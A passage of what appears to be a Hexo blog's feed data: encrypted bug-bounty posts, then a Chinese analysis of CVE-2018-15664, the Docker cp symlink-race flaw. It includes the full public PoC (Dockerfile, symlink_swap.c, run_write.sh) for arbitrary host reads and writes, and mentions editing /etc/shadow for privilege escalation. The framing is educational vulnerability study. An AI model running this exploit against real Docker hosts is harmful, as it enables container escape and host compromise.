7ef84bb31e7d79a63a8ea933875c23b1f10d6b56e4ead16cf680a114809e60ed5f74da649e23310799865942ab2b8eb7a0c17791b6784f2581a0df85bd05e23504c51bf23390417a4a018deab734b40688d073c1f29bf61ab6acd359b6d0655f2ba3c508cf37614ccc2833c53a3a78b5caa52a3ed6f64caee02d5cb61fb80b5570eaeee6f804e446bc53083f129ee6fedb3c40e44d931603b38f090b30aa776473ba1a6f3e15d0638b591d9ff60b7074eb0002a4e6db50e54b77d360c65cff8d013ea72a06e28ab988e126a33106fc3a733cf2fe05ba7ee71c1b7d506d33c2c94998090e9d431babc7ffcda403baee8531452d22e83cce8af6c74e760d8086fd9990fe88b440328ff6f833cf8176921bc834fdaaf9622ecc015fea7576545d0f995b12b46add721572ffc208e15807a1b687bcf95e3c6c2f342d19d379cc1d34c2d0a66ecf29faeede03b0697053ab70346643fc0e39d5e1949467228845e5f41fe226864434fe04e9daa1d8ea61a9cd59531700712e4542ee4c521ab168ec12f946f67cce4d6fc4a1556712553a255b4057b270ee5756c3b91a7f37f28e216b2a0a67a91ea02c38a6199b43ce5797ec784c5b790960ddcede89d0cb0e82e609fbf4fcb7ad8e0798059772c5495a7f022dbc57709b3677bd88af1c1f01e72345f2cef01acbc1cf79824fa30fbed09e12c2aa534fd27f8497d79336d08d4d24151005a71ee8fa4e0c4bf730c048f6b33bee0c8e31cdb5081ca3b619404e3865a539809b2220b94c55bde4e9083785db54ed15946cef787954a071c9123b62126a39cb00fba75886502ec372b3719d695ad61e245031970f17e3c08d9254bf946b0bd6249163d90dfbb842a90d7153cae9d86ccb8886e1ca8f4d06d3e78624f20591901f7f053074e5dc816e0c2abeed4ea494fedfbc0ad6d384ae92ce6399bf33f5438b9fbc449bd983966cb894f9b337803a0a78e744ab663b9b9fb5f9a14e767f64fb82c91bd777cf4f6a9f723a49a1d416726d7caefaf12659fc2555fa7dd31e6c40eaa15fa00ae6100c32a2ea25ed1cf24383f0991aa04f5a10d21a0fb0be75d334558b47ebee31d03ba26796e052e772d3e9736b30d5f011321b0fd761aeaa1bf8effed46f8fe9ff3a61c6ac499afc76aabfa022ff3dc645e51b5361ae8bf755d7c1885a63817bef723d2ca4314b5ed85337f93d05c76fa7d47b0d94bcdd7cea085fc104635e1766f563eb893f1cd52167532330a731ba77ce2c949d4da5dbddd45393fca3666820bd186f6875b51ba0cd953eed12f7ee4c5b0a83855942bb76911d88787300c2c2dc6a4c199c9dac1aaa59f45ef5c891afa06af8ad760ce5080bebd35ff83833d03a037cd78257db38bdfddf5558e368a94d11f338f66552a4600f7e8905770065e054129173b8b24223448679aa188bcf0e09085283772c73a5765dd9ceccd152097bb1482cd187bd1670b01f77d65e9734711e09588f869eb685c94a0845dacb005341b340518ad56ba1d8fd6ddc7469f0721bfc5f14b013158191aa8482def63e6d397991590ef2793f4386c78ee9403c2358e6248fc1a9cf5d8339e0f73991e8fd1e6e35f40d41b9a0602fa88b133f83c287fdda0c59b66eb01f58d604ccc01e254a5c763f6974057386706aa12a03ee772fcf47ee204d5aa2ad9d15c700bbbc6b6698bb4870b0a984d8782076b6c89035001f8daeac280684b95ae0da2e1b631d004038d80bd9246e493439de19ec83e679d6871ca0aa2f8b4966a0a125129220f6a88c6001197baa670f278e4f4a916d4152dc1a5181a57a27ed8d6dc04e832c19407f1ab8406b37630015e9823f32e28f1c407221625d29a16498a6a6cd64a5442b6b0f3f61e88ef909e0e7a738ab6bb56176a3d6f7031a7f74cd9c6c7ca0a42ebd2099b7478a45c357d0d4abe967b9a709df5b3eadbe417c72b2617098d008e6a5a59fe12a40602474313efcc54591ed6472046394927cc05d176338a0e368dd59444312711d3ff366daecf9a98bb754ce082e48bd272bf7dce80be5b9d696fb67e564325b9bbbe26364cdf1a45347bff56e7687a244d834356ee5ce950c2e27ecbaec619fb16a3bde46e1d182dac5e0b8f76058f90e2ce252050e76da265d38c3a40b6b9687386ba31291cc2d103ba8b5124dfcd79568396797358ee9b59c33642f09400d8e9cd719d86056a4f7c66097afa99088043eba51f522b61c90f7413032aa109dfea6510d7b77f6df42c6d5666295c611e3ec87c2355192e0105d5c6fa5521d0fc8d6f88a3447e545bf4eb1106baca7de5aa92474e8b8c97dc5d1e0039d1d802773afad78c5dd46c111cb4bdfe082eac644aabc4da80abc2770f2986a28521332bc2f0998ba65cbcc40f06ef933bba4d7bb3853b3217dc9d</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Web Security</category>
        <category>Bug Bounty</category>
      </categories>
      <tags>
        <tag>Bug bounty learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Bug Bounty Learning - Journey from LFI to RCE</title>
    <url>/2022/06/12/Bug-Bounty-Learning-Journey-from-LFI-to-RCE/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b2f682c7c1423cb14cf4aca4c2f99e1ca7378733935d5f3421a00d8375abfc35">b60e26754db75fa005b995163af0d5a1ec8bbd33d365b1eadf7044f4ac4eb25e1f8d703834b10e832769189d33c4333e4a6c446b1a1b24c0a4a762e275c5b56303e7a6271428e9533bd5418f1e92716a8594277c6189e2c20a5bac9bf580e841c744478c42fb3e54f8c63c9a5a31b75692a38a8da8abe572bfec09842aa3c2cb4a6cf86c983afd2c9a9484060dca82af904af7fa83a4d6b633a3da8f53e04b40991654921349ebbe9401c90612b4697c80bfecbfee0c5456441201278d82fda2eb5c646eb70e80adf37345a3665578726739ee234e114c3e73641b2cd2e449ed035facd0cda614247cbac9d8a3b346895d121302c4de63eb2f7a8b761683511d9daf2fc2970bb348771f0ed7f7aaf81b796a2fd9d993bb53cee526fc0fbe513d810427ef71b584fc1e0818c9a9baac19e3112385cb996c40eca2827e5a0195707acdd1edf121eadb5f624a089d7c12d3d3c93f048839d4c1069de885fc95784f3bdc9095b5ac48dd0e226e0315ccec5507b49f8f37d9c6c7a78a082059dda1c1d4ca79e51f7890f321b63724664b791f0e0bc1704348a2cbe7e0048c6f1be0e467a294b374e83815ae4185a08413d2cb49d399b7fd6c193007739257a757078fc4df8bef5a9cd33c3e1f80a8b817783adc272cedc89e3c1c740b53b2d35a077e6a39047fbb09a67253dd2111f63f28a895f0fa6dff12fd0981cd35a5635c7b6747264c39137f2e0b3733fffb4f6b30d2ed0612af625db95f10bcf433f31cc4b94675b826bfef3909e824cc736a163b5af3e5381e14b9209ff77eb625c623cb085e862e72767341e5bc8ad801df0db88ea74f3bd3dba716fe7821e9ad9768cfd37ba4018da26080b73adf9e46cc16b48be29c5fd8ffb0fd36cd5c5d15ec451712fc78db4b7aa413aeecf87c9604655ce3687d5e916ee56c50e5fcaced78421480692ff9607428dce45c382c4bc597de8736a02407ecec842f0da8d8c9a9239f8113c12046f53a04f7f15dfd3c3fc00ff65ae2a9afcc8c0724dff5a86e1408ae8f01adaf1470a54369c5d448bf9705fa66dfc221820245634de0844d153dc6946225e03e191c84805a2da17d6121a69d8815af59a41fa7a4bda4c5a30c2657ebf4512211fd1e446ab6b1c1fadb5683a01948556276c2b7bf3676602772c396c2f70486384585830dcb20c831d4fbdcc2092008ac23dc8c98e42a70f8a5c19e05e0ad9498c8cdc6ac213f309580823664d799f02c84d5ae0d8c85a0ea46c5b3ebfca25fce56b197dd18027f55e8a38e39bd3e50e0f53c5f13a6c9f6e65f8b449823a01a086f5ab89a4df4deafb24e4289bc7e4956c60041b6bcf4f3bcba639df0b3042c6c96454b0811111ad8b4aef771f58a860d49e4dca2037df79c1cae6d1cee1b02cfddec4ee6590df135ffb64ec2defa198711c5f034e3803cbea6ce90619f2eff612431f191fa765b6ab1009676e86004a364998308325ab2341e122fa8291411c6e29d246857c72f1173b2d8c6e3401dc9f8c5c0ebc19869b40c2642754c003f7b9620f3c7d016a5dcd46983a4030679b9534f41e435dc4cf368ff8b2484656ac9144639abc658b93923d846613a47b40f7329facec384357493f520ad88609d4b637186e5105db054f4fcce9ab5af8f3e6146e6b6fb45be35d3b460821b4aaa321aa5c57ef883eec845427f72918b5415cdc2b39274d1ff7ec55b8a2db2a2c43b231276de75d1f2b7ac0085f33244d03149c817cb885f394cefbb7cca3b86feb0ee52c0b7fe9c60f617238802c3b65b7c41dad8d1e4843410bca0750bbf12ddfb33a3e010b0531a0ecb972f1af6c46b483b5da715f9ecd7198705e487f7cfd70ba7b31836c7b21410a6f85ec3a25737e24fc66788d661ac0bce0fc6bb22f2cf9ebefaf771c5847a1f6a5b4ec00c487e25c512b7e6e1644c4f147d11112ae3538ebee33475a24a5b3b5ce492a82da993ec9949d9b57a624eb7f61b24d765a01dcc0a7f5ff6798d192bb876180db6ec5c758bd4f7676d443245583ae797fb2d15cc7ceadaa94ef22bc8e712892863b3c36065f434adf6d242aa8483b0ef030c522f840a831731d3240a9fb245808cbb07863e7c8e675912230f782bf28e7e6b096576c8319110c570b17fafb1a1f7d6690f39be1b88e097903a9d033c5c9c6e6cf10cd2859a8b5be458f0f2103040f78a59b23bb3b30f2dd6a3eca90a88b56248765339604a41314fcc736cc59177ce147c146bd7767ebca3ee7e47e038813acaa2afb55f0a45cd9ccd7c528eed4df008a6cf82d117efb2c11d5b127a6d5743ebe58a1bb4fb7e7f47cf80b8144da10382cad2120f75cd91213b4e0536b51f84396188d55ed26befe27e4e209188a901f3612220cece917f33f08e849861b83a8deb8558dbd5b1c4e719ca922e554e11b2c7ffe669e56f57a2440462b6826370285673301cfc6c3d75464f58d900420deb1703fbd455a82fef1e91695874754497f8263b6fdd31ba0f3794c1577f8a32243f15f8ee9693de80b7591b5a63a5f01711f2edb0afbfe46ce3efc8800f61c93694852ba8028db3aa18ed93870b292c0c0feb94ad187dc9499fa5f977abe0c437099b5f19ae47b08f7d30e19f44bc9036390a1fec5cee2b1e487a8f6276591afbe9926e1e6445925a0dd78b4f1c31c144efc319550c95b9d00cf3fa13b80aa901894aaf19d672f21cca3b25db4b60321bee26a6706a1c76536c6ef7924f9cccd5226cd79fbc7298c0ea2fc879350da0abe09e890a1cdff9ca88712a8e1bda9e43a758ab9914e888ebc2841852dad2eb1c97b4ab3464b65bdb371ac413dc7191374a88c8471e660a93db45492b011e7cff4dea5ec6cbf9064c877867b684d09079c558dee92fd422b1a08aac1f43f7e5bea4beec726d093885baa1ac1d8b205675cdce0452a1a977598ba974d1d139b77d9451f3677b4321466ec3f943da857912ac2ad8a367c0435131a898e14f31b7be51c7d38f2c31bf0f75af01890366</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Web Security</category>
        <category>Bug Bounty</category>
      </categories>
      <tags>
        <tag>Bug bounty learning</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-15664符号链接替换漏洞</title>
    <url>/2022/01/23/CVE-2018-15664%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E6%9B%BF%E6%8D%A2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>试想在渗透过程中拿到了一个宿主机的权限，但权限过低无法读写文件，应该如何提权或者实现对该宿主机的其他目录进行任意读写操作呢？</p>
<p><a href="https://seclists.org/oss-sec/2019/q2/131">Aleksa Sarai</a>于2019年公布了一个<strong>docker symlink-race attack</strong>漏洞 - 在<strong>Docker 18.06.1-ce-rc2</strong>版本之前，docker中的<code>FollowSymblinkInScope()</code>函数有可能因race condition(条件竞争)遭受**TOCTOU(Time of Check to Time of Use)**攻击，而docker cp的实现大量使用了该函数，因此docker cp存在被利用的危险。</p>
<span id="more"></span>

<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="TOCTOU-Attack"><a href="#TOCTOU-Attack" class="headerlink" title="TOCTOU Attack"></a>TOCTOU Attack</h2><p>从字面意思上理解，TOCTOU(Time of Check to Time of Use) 实际上就是指check(检查)到use(使用)的这段时间。</p>
<h2 id="Symlink"><a href="#Symlink" class="headerlink" title="Symlink"></a>Symlink</h2><p>Symlink也就是软链接(symbolic link)、符号链接。</p>
<p>假设A是B的软链接，A指向的inode实际上与B指向的inode是不一样的，但是A的数据块中存放了B的路径（具体见操作系统中软链接和硬链接的概念与区别）。</p>
<p>linux中设置一个软链接（类似于Windows上的快捷方式）：</p>
<p><code>ln -s /home/a/old symlink </code></p>
<h2 id="FollowSymlinkInScope"><a href="#FollowSymlinkInScope" class="headerlink" title="FollowSymlinkInScope"></a>FollowSymlinkInScope</h2><p>在docker中，<code>FollowSymlinkInScope</code>函数的作用是将一个path进行安全地解析，解析后再进行使用。</p>
<p>问题就在于 - 解析完之后和使用之前有间隙，用Aleksa的话说就是：</p>
<blockquote>
<p>After the full path has been resolved, the resolved path is passed around a bit and then operated on a bit later.</p>
</blockquote>
<p>这就意味着，如果在解析检查完路径<strong>之后</strong>、使用<strong>之前</strong>添加一个**symlink(软链接)**，最后实际操作的实际是<code>symlink</code>指向的路径，而非其原本想要使用的解析的路径。</p>
<h2 id="docker-cp"><a href="#docker-cp" class="headerlink" title="docker cp"></a>docker cp</h2><p><code>docker cp</code>命令就使用了该函数。</p>
<p><code>docker cp /a ctn_id:/b</code>这段命令表示将<strong>宿主机的/a复制到容器下的/b</strong>。在这个复制的过程中，docker会解析<code>/b</code>，如果<code>/b</code>是容器内的一个<strong>符号链接</strong>，那么就会将其在<strong>容器内</strong>解析为路径，最后再进行复制。</p>
<ul>
<li><p>这里想象一个攻击场景：先让<code>/b</code>是一个容器里的正常路径，在容器检查解析完<code>/b</code>之后，赶在容器使用该解析后的path之前，将<code>/b</code>指向一个恶意的<code>symlink</code>。最后<code>/b</code>这个symlink会在<strong>宿主机上进行解析</strong>，如果该符号链接<code>/b</code>在容器内指向容器中的根目录<code>/</code>，那么现在他会在宿主机上被解析为宿主机的根目录<code>/</code>，而并不是在容器里被解析。<strong>因此这段复制命令，会变成将宿主机下的/a复制到宿主机下的<code>/</code>目录</strong>，这就实现了任意写的功能。</p>
</li>
<li><p>再想象一个攻击场景：<code>docker cp ctn_id:/b /a </code>命令将容器下的<code>/b</code>复制到宿主机下的<code>/a</code>，利用该漏洞，我们可以将<code>/b</code>用symlink指向我们想要读取的任意文件，在宿主机上解析之后，就能将该文件复制到<code>/a</code>上了。这就实现了任意读的功能。</p>
</li>
</ul>
<h1 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h1><p>拿到低权限账户，但该账户可以使用docker cp命令。可以通过该漏洞读取任意文件，也可以通过修改<code>/etc/shadow</code>文件来实现提权。</p>
<blockquote>
<p><strong>题外话</strong>：但其实这种利用场景并不特别实用，如果拿到的宿主机用户并非ROOT权限，却又能使用docker的命令，那么其实使用Docker运行一个特权容器会更为简单。</p>
</blockquote>
<h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><p><a href="https://github.com/Metarget/metarget">使用Metarget靶场安装</a>存在漏洞的docker版本</p>
<ul>
<li>Ubuntu 16.04 or 18.04</li>
<li><strong>Python &gt;= 3.6</strong> (Python 2.x is unsupported!)</li>
<li>pip3</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装CVE-2018-15664环境</span></span><br><span class="line">./metarget cnv install cve-2018-15664</span><br></pre></td></tr></table></figure>

<h1 id="POC解析"><a href="#POC解析" class="headerlink" title="POC解析"></a>POC解析</h1><p>我们下载好后的POC结构如下：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220124160721960.png" alt="image-20220124160721960"></p>
<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Build the binary.</span></span><br><span class="line"><span class="keyword">FROM</span> opensuse/leap</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> zypper <span class="keyword">in</span> -y gcc glibc-devel-static</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /builddir</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> symlink_swap.c /builddir/symlink_swap.c</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc -Wall -Werror -static -o /builddir/symlink_swap /builddir/symlink_swap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up our malicious rootfs.</span></span><br><span class="line"><span class="keyword">FROM</span> opensuse/leap</span><br><span class="line"><span class="keyword">ARG</span> SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"><span class="keyword">ARG</span> SYMSWAP_PATH=/totally_safe_path</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;FAILED -- INSIDE CONTAINER PATH&quot;</span> &gt;<span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=0 /builddir/symlink_swap /symlink_swap</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/symlink_swap&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该Dockerfile主要是为了构建漏洞利用程序symlink_swap（通过gcc来编译），并将其放在容器的根目录下。在该根目录下创建一个<code>w00t_w00t_im_a_flag</code>文件，文件内容为<code>&quot;FAILED -- INSIDE CONTAINER PATH&quot; &gt;&quot;</code></p>
<h2 id="symlink-swap-c"><a href="#symlink-swap-c" class="headerlink" title="symlink_swap.c"></a>symlink_swap.c</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> usage() \</span></span><br><span class="line"><span class="meta">	do &#123; printf(<span class="string">&quot;usage: symlink_swap &lt;symlink&gt;\n&quot;</span>); exit(1); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bail(msg) \</span></span><br><span class="line"><span class="meta">	do &#123; perror(<span class="string">&quot;symlink_swap: &quot;</span> msg); exit(1); &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* No glibc wrapper for this, so wrap it ourselves. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RENAME_EXCHANGE (1 &lt;&lt; 1)</span></span><br><span class="line"><span class="comment">/*int renameat2(int olddirfd, const char *oldpath,</span></span><br><span class="line"><span class="comment">              int newdirfd, const char *newpath, int flags)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* usage: symlink_swap &lt;symlink&gt; */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">		<span class="built_in">usage</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *symlink_path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">char</span> *stash_path = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">asprintf</span>(&amp;stash_path, <span class="string">&quot;%s-stashed&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">bail</span>(<span class="string">&quot;create stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Create a dummy file at symlink_path. */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">stat</span> sb = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">lstat</span>(symlink_path, &amp;sb)) &#123;</span><br><span class="line">		<span class="type">int</span> err;</span><br><span class="line">		<span class="keyword">if</span> (sb.st_mode &amp; S_IFDIR)</span><br><span class="line">			err = <span class="built_in">rmdir</span>(symlink_path);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			err = <span class="built_in">unlink</span>(symlink_path);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">bail</span>(<span class="string">&quot;unlink symlink_path&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now create a symlink to &quot;/&quot; (which will resolve to the host&#x27;s root if we</span></span><br><span class="line"><span class="comment">	 * win the race) and a dummy directory at stash_path for us to swap with.</span></span><br><span class="line"><span class="comment">	 * We use a directory to remove the possibility of ENOTDIR which reduces</span></span><br><span class="line"><span class="comment">	 * the chance of us winning.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">symlink</span>(<span class="string">&quot;/&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">bail</span>(<span class="string">&quot;create symlink_path&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">mkdir</span>(stash_path, <span class="number">0755</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">bail</span>(<span class="string">&quot;mkdir stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now we do a RENAME_EXCHANGE forever. */</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">int</span> err = <span class="built_in">renameat2</span>(AT_FDCWD, symlink_path,</span><br><span class="line">	                        AT_FDCWD, stash_path, RENAME_EXCHANGE);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">perror</span>(<span class="string">&quot;symlink_swap: rename exchange failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>symlink_swap这个恶意文件将会被放在docker容器里，被攻击者用来循环交换symlink和一个正常路径的名字。</p>
<p>如果我们想利用<code>docker cp /shellcode ctr_id:/test</code>命令来完成向宿主机的根目录``/<code>写入</code>shellcode`：</p>
<ul>
<li>使用该恶意程序在容器中创建一个符号链接，该符号链接指向<code>/</code>根目录，命名该符号链接为<code>evil</code></li>
<li>再创建一个<code>/test</code>的正常目录，无限循环地<strong>重命名（交换）</strong><code>/test</code>和<code>/evil</code>的名字。</li>
<li>漏洞未触发时，docker守护进程解析的<code>/test</code>并不是一个符号链接，解析完之后，恶意程序将<code>/test</code>和<code>/evil</code>的名字进行交换(重命名)</li>
<li>当docker开始copy操作的时候，实际copy的<code>ctr_id:/test</code>变成了一个符号链接(也就是重命名后的<code>evil</code>)</li>
<li>该符号链接在宿主机上被解析为<code>/</code>，而这个<code>/</code>会指向宿主机的<code>/</code>，从而我们完成了将<code>shellcode</code>写入宿主机根目录<code>/</code>的跨目录写操作。</li>
</ul>
<h2 id="run-read-sh和run-write-sh"><a href="#run-read-sh和run-write-sh" class="headerlink" title="run_read.sh和run_write.sh"></a>run_read.sh和run_write.sh</h2><p>POC中提供了两个shell可以利用：</p>
<p><strong>run_read.sh</strong></p>
<ul>
<li>使用docker cp将容器内文件复制到宿主机</li>
<li>利用漏洞可以完成在宿主机上任意读的操作</li>
</ul>
<p><strong>run_write.sh</strong></p>
<ul>
<li>使用docker cp将宿主机上的文件复制到容器</li>
<li>利用漏洞可以完成在宿主机上任意写的操作</li>
</ul>
<p>此处我们将使用run_write.sh来模拟任意写的操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;FAILED -- HOST FILE UNCHANGED&quot;</span> | sudo <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 0444 <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run and build the malicious image.</span></span><br><span class="line">docker build -t cyphar/symlink_swap \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_PATH=<span class="variable">$SYMSWAP_PATH</span>&quot;</span> \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_TARGET=<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> build/</span><br><span class="line">ctr_id=$(docker run --<span class="built_in">rm</span> -d cyphar/symlink_swap <span class="string">&quot;<span class="variable">$SYMSWAP_PATH</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SUCCESS -- HOST FILE CHANGED&quot;</span> | <span class="built_in">tee</span> localpath</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now continually try to copy the files.</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	docker <span class="built_in">cp</span> localpath <span class="string">&quot;<span class="variable">$&#123;ctr_id&#125;</span>:<span class="variable">$SYMSWAP_PATH</span>/<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结合恶意程序和该run_write.sh看，该shell的目的是将localpath文件的内容(“SUCCESS – HOST FILE CHANGED”)写入宿主机的<code>/</code>中，从而实现在宿主机上跨目录任意写的操作。当然我们不能保证我们每次都是在docker守护进程解析之后才进行名字的交换，所以不是每一次都能成功。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>这里我们使用<strong>run_write.sh</strong>来完成攻击</p>
<p>直接<code>./run_write.sh</code>运行即可</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220124170822558.png" alt="image-20220124170822558"></p>
<h1 id="后续修复"><a href="#后续修复" class="headerlink" title="后续修复"></a>后续修复</h1><p><a href="https://developer.aliyun.com/article/704515">https://developer.aliyun.com/article/704515</a></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>阿里云容器服务 ACK. (2019). <em>CVE-2018-15664漏洞分析报告-阿里云开发者社区</em>. [online] Available at: <a href="https://developer.aliyun.com/article/704515">https://developer.aliyun.com/article/704515</a> [Accessed 24 Jan. 2022].</p>
<p>Sarai, A. (2019). <em>oss-sec: CVE-2018-15664: docker (all versions) is vulnerable to a symlink-race attack</em>. [online] Available at: <a href="https://seclists.org/oss-sec/2019/q2/131">https://seclists.org/oss-sec/2019/q2/131</a> [Accessed 23 Jan. 2022].</p>
<h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><blockquote>
<p>源码：docker-ce-18.13.1-ce</p>
<p>docker/pkg/symlink/fs.go：FollowSymlinkInScope</p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// FollowSymlinkInScope is a wrapper around evalSymlinksInScope that returns an</span></span><br><span class="line"><span class="comment">// absolute path. This function handles paths in a platform-agnostic manner.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FollowSymlinkInScope</span><span class="params">(path, root <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    path, err := filepath.Abs(filepath.FromSlash(path))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    root, err = filepath.Abs(filepath.FromSlash(root))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span 